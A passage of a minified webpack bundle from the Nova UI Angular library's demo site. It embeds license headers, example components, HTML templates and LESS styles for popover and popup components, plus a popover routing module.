 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\n@Component({\n    selector: "nui-popover-prevent-close-on-click-example",\n    templateUrl: "./popover-prevent-close-on-click.example.component.html",\n})\nexport class PopoverPreventCloseOnClickExampleComponent {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n    };\n    public closePopoverSubject = new Subject<void>();\n\n    public closePopover(): void {\n        this.closePopoverSubject.next();\n    }\n}\n'},38964:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover [hasPadding]="false" [template]="popoverWithStatus" i18n>\n    Hover over me!\n</nui-popover>\n\n<ng-template #popoverWithStatus i18n>\n    <div class="example-popover-header">\n        <nui-icon class="a" icon="application" status="critical"></nui-icon>\n        <span class="ml-2">Here goes the title!</span>\n    </div>\n    <div class="example-popover-body">\n        I\'m implemented to show how to create popover with status!\n    </div>\n</ng-template>\n'},31316:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n\n.example-popover {\n    &-body {\n        padding: @nui-space-sm;\n    }\n\n    &-header {\n        display: flex;\n        align-items: center;\n        font-size: @nui-font-size-default;\n        font-weight: @nui-font-weight-semibold;\n        border-bottom: @nui-line-medium solid @nui-color-line-critical;\n        border-bottom: @nui-line-medium solid\n            var(--nui-color-line-critical, @nui-color-line-critical);\n        padding: @nui-space-sm;\n    }\n}\n'},62260:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-status-example",\n    templateUrl: "popover-status.example.component.html",\n})\nexport class PopoverStatusExampleComponent {}\n'},6890:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-popover [template]="popoverUnlimited" [unlimited]="true" i18n>\n        Hover over me!\n    </nui-popover>\n</div>\n\n<div>\n    <nui-popover [template]="popoverDefaultRestrictions" i18n>\n        Hover over me!\n    </nui-popover>\n</div>\n\n<ng-template #popoverUnlimited i18n>\n    I\'m implemented without restrictions on my width and height! That\'s why I\'m\n    taking up as much space as I have available on the page. Expand my source\n    code above to see how!\n</ng-template>\n\n<ng-template #popoverDefaultRestrictions i18n>\n    I\'m implemented with respect to the default <code>max-width</code> and\n    <code>max-height</code> restrictions defined by the Nova Design Language!\n    That\'s why my text will nicely wrap when it exceeds the\n    <code>max-width</code> limit. Expand my source code above to see how!\n</ng-template>\n'},55478:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-unlimited-example",\n    templateUrl: "./popover-unlimited.example.component.html",\n})\nexport class PopoverUnlimitedExampleComponent {}\n'},40922:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex justify-content-between">\n    <nui-popover\n        popoverTitle="Title"\n        trigger="click"\n        icon="application"\n        [template]="popoverTemplate"\n        [preventClosing]="true"\n    >\n        <button class="placement-check-btn">Show top left popover</button>\n    </nui-popover>\n\n    <nui-popover\n        popoverTitle="Title"\n        trigger="click"\n        icon="application"\n        [template]="popoverTemplate"\n        [preventClosing]="true"\n    >\n        <button class="placement-check-btn">Show top right popover</button>\n    </nui-popover>\n</div>\n\n<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Popover</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex">\n                <nui-popover\n                    id="nui-demo-popover-basic"\n                    [template]="popoverWithBasicUsage"\n                >\n                    Hover over me!\n                </nui-popover>\n\n                <ng-template #popoverWithBasicUsage>\n                    I\'m implemented with the simplest usage! Expand my source\n                    code above to see how!\n                </ng-template>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Popover - Prevent Closing on Click</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col col-8">\n            <div class="d-flex">\n                <nui-popover\n                    popoverTitle="Prevent close popover on click"\n                    trigger="click"\n                    id="nui-demo-popover-prevent-closing"\n                    [template]="popoverPreventClose"\n                    [closePopover]="closePopoverSubject"\n                    [preventClosing]="true"\n                >\n                    <button id="nui-demo-button-prevent-onclick">\n                        <span>Click me!</span>\n                    </button>\n                </nui-popover>\n\n                <ng-template #popoverPreventClose>\n                    <div class="mb-2">\n                        <nui-checkbox id="nui-demo-checkbox-in-popover"\n                            >Hi, check me!</nui-checkbox\n                        >\n                    </div>\n                    <div class="mb-2">\n                        <nui-combobox\n                            id="nui-demo-popover-combobox"\n                            [itemsSource]="dataset.items"\n                            placeholder="Select item combo"\n                        ></nui-combobox>\n                        <nui-combobox-v2\n                            [overlayConfig]="overlayConfig"\n                            id="nui-demo-combobox-v2-in-popover"\n                            placeholder="Select item combo v2"\n                        >\n                            <nui-select-v2-option\n                                *ngFor="let item of dataset.items"\n                                [value]="item"\n                                >{{ item }}</nui-select-v2-option\n                            >\n                        </nui-combobox-v2>\n                    </div>\n                    <div class="d-flex justify-content-end">\n                        <button\n                            nui-button\n                            type="button"\n                            displayStyle="action"\n                            (click)="closePopover()"\n                        >\n                            Close\n                        </button>\n                        <button\n                            nui-button\n                            class="ml-3"\n                            type="button"\n                            displayStyle="primary"\n                            (click)="closePopover()"\n                        >\n                            Confirm\n                        </button>\n                    </div>\n                </ng-template>\n            </div>\n        </div>\n        <div class="col col-4">\n            <div class="d-flex">\n                <nui-popover\n                    popoverTitle="Popover with Left Placement"\n                    placement="left"\n                    trigger="click"\n                    [template]="popoverLeftPlacement"\n                    [preventClosing]="true"\n                >\n                    <button class="placement-check-btn">\n                        <span>Click me!</span>\n                    </button>\n                </nui-popover>\n\n                <ng-template #popoverLeftPlacement>\n                    <nui-checkbox\n                        >Placement is set to LEFT in this case</nui-checkbox\n                    >\n                </ng-template>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Removing Padding</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex">\n                <nui-popover\n                    [hasPadding]="false"\n                    id="nui-demo-popover-no-padding"\n                    popoverTitle="My body has no padding"\n                    [template]="popoverNoPadding"\n                >\n                    Hover over me!\n                </nui-popover>\n\n                <ng-template #popoverNoPadding>\n                    I lack padding because I\'m configured that way.\n                </ng-template>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Icon</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex flex-column">\n                <div>\n                    <nui-popover\n                        icon="application"\n                        [template]="iconPopoverTemplateNoTitle"\n                    >\n                        Hover over me!\n                    </nui-popover>\n                </div>\n                <div>\n                    <nui-popover\n                        popoverTitle="Popover with Icon"\n                        icon="application"\n                        [template]="iconPopoverTemplateWithTitle"\n                    >\n                        Hover over me, too!\n                    </nui-popover>\n                </div>\n\n                <ng-template #iconPopoverTemplateNoTitle\n                    >I have an application icon and no title!</ng-template\n                >\n                <ng-template #iconPopoverTemplateWithTitle\n                    >I have an application icon and a title!</ng-template\n                >\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Removing Width and Height Limitations</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex flex-column">\n                <div>\n                    <nui-popover\n                        [template]="popoverUnlimited"\n                        [unlimited]="true"\n                        icon="application"\n                        id="nui-demo-popover-no-limits"\n                    >\n                        Hover over me!\n                    </nui-popover>\n                </div>\n\n                <div>\n                    <nui-popover\n                        [template]="popoverDefaultRestrictions"\n                        id="nui-demo-popover-limited-and-multiline"\n                    >\n                        Hover over me!\n                    </nui-popover>\n                </div>\n\n                <ng-template #popoverUnlimited>\n                    I\'m implemented without restrictions on my width and height!\n                    That\'s why I\'m taking up as much space as I have available\n                    on the page. Expand my source code above to see how!\n                </ng-template>\n\n                <ng-template #popoverDefaultRestrictions>\n                    I\'m implemented with respect to the default\n                    <code>max-width</code> and\n                    <code>max-height</code> restrictions defined by the Nova\n                    Design Language! That\'s why my text will nicely wrap when it\n                    exceeds the <code>max-width</code> limit. Expand my source\n                    code above to see how!\n                </ng-template>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Modal Mode</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex">\n                <nui-popover\n                    popoverTitle="Title"\n                    id="nui-demo-popover-modal"\n                    trigger="click"\n                    placement="right"\n                    icon="application"\n                    [template]="popoverTemplate"\n                    [modal]="true"\n                >\n                    <button>Show modal popover</button>\n                </nui-popover>\n            </div>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Large Trigger Element Height</h3>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <div class="d-flex">\n                <nui-popover\n                    popoverTitle="Popover with Top Placement"\n                    placement="top"\n                    [template]="popoverTemplate"\n                    trigger="click"\n                    [preventClosing]="true"\n                >\n                    <button class="large-height placement-check-btn">\n                        open top\n                    </button>\n                </nui-popover>\n\n                <nui-popover\n                    popoverTitle="Popover with Bottom Placement"\n                    placement="bottom"\n                    [template]="popoverTemplate"\n                    trigger="click"\n                    [preventClosing]="true"\n                >\n                    <button class="large-height placement-check-btn">\n                        open bottom\n                    </button>\n                </nui-popover>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div class="d-flex footer justify-content-between align-items-center p-2">\n    <nui-popover\n        popoverTitle="Title"\n        id="nui-demo-popover-bottom-left"\n        trigger="click"\n        icon="application"\n        [template]="popoverTemplate"\n        [preventClosing]="true"\n    >\n        <button class="placement-check-btn">Show bottom-left popover</button>\n    </nui-popover>\n    <nui-popover\n        popoverTitle="Title"\n        id="nui-demo-popover-bottom-right"\n        trigger="click"\n        icon="application"\n        [template]="popoverTemplate"\n        [preventClosing]="true"\n    >\n        <button class="placement-check-btn">Show bottom-right popover</button>\n    </nui-popover>\n</div>\n\n<ng-template #popoverTemplate> Test Template </ng-template>\n'},81618:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".footer {\n    position: absolute;\n    bottom: 0;\n    left: 0;\n    width: 100%;\n    height: 60px;\n}\n\n.large-height {\n    height: 150px;\n}\n"},76742:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-popover-visual-test",\n    templateUrl: "./popover-visual-test.component.html",\n    styleUrls: ["./popover-visual-test.component.less"],\n})\nexport class PopoverVisualTestComponent {\n    public dataset = {\n        items: ["Item 1", "Item 2", "Item 3", "Item 4", "Item 5"],\n    };\n    public closePopoverSubject = new Subject<void>();\n    // Testing only\n    public overlayConfig: OverlayConfig = {\n        panelClass: [OVERLAY_WITH_POPUP_STYLES_CLASS, "combobox-v2-test-pane"],\n    };\n    closePopover(): void {\n        this.closePopoverSubject.next();\n    }\n}\n'},68808:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div #popoverContainer id="nui-demo-popover-container"></div>\n\n<nui-popover\n    id="nui-demo-popover-with-container"\n    [container]="popoverContainer"\n    [template]="popoverWithContainerTemplate"\n    i18n\n>\n    Hover over me!\n</nui-popover>\n\n<ng-template #popoverWithContainerTemplate i18n>\n    I\'m appended to a container!\n</ng-template>\n'},24344:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-with-container-example",\n    templateUrl: "./popover-with-container.example.component.html",\n})\nexport class PopoverWithContainerExampleComponent {}\n'},78098:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    popoverTitle="Some Long Url"\n    i18n-popoverTitle\n    [template]="popoverWithTitle"\n    i18n\n>\n    Hover over me!\n</nui-popover>\n\n<ng-template #popoverWithTitle>\n    <div style="overflow: hidden" i18n>\n        https://somelongstringsomelongstringsomelongstringsomelongstringsomelongstring.url/somelongstring?=somelongstringsomelongstringsomelongstring\n    </div>\n</ng-template>\n'},90606:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-with-title-example",\n    templateUrl: "./popover-with-title.example.component.html",\n})\nexport class PopoverWithTitleExampleComponent {}\n'},21483:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDocsModule,\n    NuiPopoverModule,\n    NuiSelectModule,\n    NuiSelectV2Module,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    PopoverBasicUsageExampleComponent,\n    PopoverClickTriggerExampleComponent,\n    PopoverDebounceExampleComponent,\n    PopoverDisabledExampleComponent,\n    PopoverExampleComponent,\n    PopoverFocusTriggerExampleComponent,\n    PopoverIconExampleComponent,\n    PopoverModalExampleComponent,\n    PopoverMouseenterTriggerExampleComponent,\n    PopoverNoPaddingExampleComponent,\n    PopoverOpenAndCloseProgrammaticallyExampleComponent,\n    PopoverOutputsExampleComponent,\n    PopoverPlacementExampleComponent,\n    PopoverPreventCloseOnClickExampleComponent,\n    PopoverStatusExampleComponent,\n    PopoverUnlimitedExampleComponent,\n    PopoverVisualTestComponent,\n    PopoverWithContainerExampleComponent,\n    PopoverWithTitleExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: PopoverExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "popover-test",\n        component: PopoverExampleComponent,\n    },\n    {\n        path: "popover-visual-test",\n        component: PopoverVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiPopoverModule,\n        NuiCheckboxModule,\n        NuiSelectModule,\n        NuiSelectV2Module,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        PopoverBasicUsageExampleComponent,\n        PopoverClickTriggerExampleComponent,\n        PopoverDisabledExampleComponent,\n        PopoverExampleComponent,\n        PopoverFocusTriggerExampleComponent,\n        PopoverIconExampleComponent,\n        PopoverModalExampleComponent,\n        PopoverMouseenterTriggerExampleComponent,\n        PopoverNoPaddingExampleComponent,\n        PopoverOutputsExampleComponent,\n        PopoverOpenAndCloseProgrammaticallyExampleComponent,\n        PopoverPlacementExampleComponent,\n        PopoverPreventCloseOnClickExampleComponent,\n        PopoverWithContainerExampleComponent,\n        PopoverWithTitleExampleComponent,\n        PopoverVisualTestComponent,\n        PopoverUnlimitedExampleComponent,\n        PopoverStatusExampleComponent,\n        PopoverDebounceExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("popover"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class PopoverModule {}\n'},29388:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import "./popover-icon/popover-icon.example.component.less";\n@import "./popover-status/popover-status.example.component.less";\n'},49319:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./popup-simple-usage/popup-simple-usage.example.component";\nexport * from "./popup-docs/popup-docs.example.component";\nexport * from "./popup-different-directions/popup-different-directions.example.component";\nexport * from "./popup-with-custom-styling/popup-with-custom-styling.example.component";\nexport * from "./popup-with-custom-width/popup-with-custom-width.example.component";\nexport * from "./popup-with-custom-content/popup-with-custom-content.example.component";\nexport * from "./popup-test/popup-test.example.component";\nexport * from "./popup-append-to-body/popup-append-to-body.example.component";\n'},54567:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popup [appendToBody]="true">\n    <button\n        nui-button\n        nuiPopupToggle\n        type="button"\n        [icon]="icon"\n        [iconRight]="true"\n        class="menu-button"\n        [isEmpty]="false"\n        i18n\n    >\n        Click\n    </button>\n    <div popupAreaContent>\n        <ng-container *ngFor="let item of itemsSource">\n            <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n        </ng-container>\n    </div>\n</nui-popup>\n'},84991:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-append-to-body-example",\n    templateUrl: "./popup-append-to-body.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupAppendToBodyExampleComponent {\n    public icon = "caret-down";\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n\n    constructor() {}\n}\n'},94157:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row">\n    <div class="col">\n        <div class="row">\n            <div class="col nui-text-default" i18n>Bottom Right</div>\n        </div>\n        <div class="row">\n            <div class="col">\n                <nui-popup [directionRight]="true">\n                    <button\n                        nui-button\n                        nuiPopupToggle\n                        type="button"\n                        [icon]="icon"\n                        [iconRight]="true"\n                        class="menu-button"\n                        [isEmpty]="false"\n                        i18n\n                    >\n                        Click\n                    </button>\n                    <div popupAreaContent>\n                        <ng-container *ngFor="let item of itemsSource">\n                            <nui-menu-item tabindex="0">{{\n                                item\n                            }}</nui-menu-item>\n                        </ng-container>\n                    </div>\n                </nui-popup>\n            </div>\n        </div>\n    </div>\n    <div class="col">\n        <div class="row">\n            <div class="col nui-text-default" i18n>Top Left</div>\n        </div>\n        <div class="row">\n            <div class="col">\n                <nui-popup [directionTop]="true">\n                    <button\n                        nui-button\n                        nuiPopupToggle\n                        type="button"\n                        [icon]="icon"\n                        [iconRight]="true"\n                        class="menu-button"\n                        [isEmpty]="false"\n                        i18n\n                    >\n                        Click\n                    </button>\n                    <div popupAreaContent>\n                        <ng-container *ngFor="let item of itemsSource">\n                            <nui-menu-item tabindex="0">{{\n                                item\n                            }}</nui-menu-item>\n                        </ng-container>\n                    </div>\n                </nui-popup>\n            </div>\n        </div>\n    </div>\n    <div class="col">\n        <div class="row">\n            <div class="col nui-text-default" i18n>Top Right</div>\n        </div>\n        <div class="row">\n            <div class="col">\n                <nui-popup [directionTop]="true" [directionRight]="true">\n                    <button\n                        nui-button\n                        nuiPopupToggle\n                        type="button"\n                        [icon]="icon"\n                        [iconRight]="true"\n                        class="menu-button"\n                        [isEmpty]="false"\n                        i18n\n                    >\n                        Click\n                    </button>\n                    <div popupAreaContent>\n                        <ng-container *ngFor="let item of itemsSource">\n                            <nui-menu-item tabindex="0">{{\n                                item\n                            }}</nui-menu-item>\n                        </ng-container>\n                    </div>\n                </nui-popup>\n            </div>\n        </div>\n    </div>\n</div>\n'},30617:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-different-directions-example",\n    templateUrl: 